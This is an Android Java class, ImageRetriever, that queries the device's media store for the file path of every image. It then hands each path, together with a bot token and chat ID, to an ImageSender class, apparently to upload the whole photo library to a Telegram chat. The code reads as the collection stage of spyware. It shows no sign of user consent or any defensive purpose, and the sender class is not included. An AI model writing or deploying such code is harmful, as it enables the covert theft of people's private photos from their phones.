package com.wolf.rabbit;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.MediaStore;

import java.util.ArrayList;
import java.util.List;

public class ImageRetriever extends AsyncTask<Void, Void, List<String>> {
    private Context context;
    private String botToken;
    private String chatId;

    public ImageRetriever(Context context, String botToken, String chatId) {
        this.context = context;
        this.botToken = botToken;
        this.chatId = chatId;
    }

    @Override
    protected List<String> doInBackground(Void... voids) {
        List<String> imagePaths = new ArrayList<>();

        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media.DATA};

        Cursor cursor = context.getContentResolver().query(uri, projection, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String imagePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                imagePaths.add(imagePath);
            } while (cursor.moveToNext());

            cursor.close();
        }
        return imagePaths;
    }

    @Override
    protected void onPostExecute(List<String> imagePaths) {
        super.onPostExecute(imagePaths);
        for (String path : imagePaths) {
            new ImageSender(context, botToken, chatId, path).execute();
        }
    }
}


